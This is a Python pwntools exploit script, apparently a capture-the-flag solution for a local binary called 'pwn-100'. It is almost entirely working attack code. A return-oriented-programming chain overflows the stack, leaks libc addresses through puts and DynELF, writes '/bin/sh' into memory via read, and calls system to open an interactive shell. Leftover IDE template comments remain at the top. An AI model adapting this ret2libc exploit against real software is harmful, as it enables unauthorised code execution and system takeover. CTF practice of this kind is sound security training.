# This is a sample Python script.
import os

import elftools.elf.segments
import pwn
# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
from pwn import *
import LibcSearcher
from gadget import *

main_address = 0x400550
pop_rdi = 0x400763

elf = ELF("./pwn-100")
write_able_address = 0x601040
read_plt = elf.symbols['read']
read_got = elf.got['read']
puts_plt = elf.symbols["puts"]

proc = process('./pwn-100')


def leak_system(addr):
    payload = cyclic(0x48)
    payload += p64(pop_rdi) + p64(addr) + p64(puts_plt)
    payload += p64(main_address)
    payload = payload.ljust(200,)  # read padding
    proc.send(payload)
    proc.recvuntil(b"\n")
    data = proc.recv()[:-1]
    data = data if data else b"\x00"
    data = data[:8]
    return data
print(hex(elf.bss()))
dynelf = DynELF(leak_system, elf=ELF('./pwn-100'))

system_address = dynelf.lookup('system', 'libc')
proc.send(gadget(read_got, [0,write_able_address, 8]))
proc.recvuntil(b'bye~\n')
proc.send(b'/bin/sh\x00')

payload=cyclic(0x48)+p64(pop_rdi)+\
        p64(write_able_address)+\
        p64(pop_rdi+1)+\
        p64(system_address)
payload=payload.ljust(200)
proc.send(payload)
#proc.send(gadget(system_address, [write_able_address]))
proc.interactive()
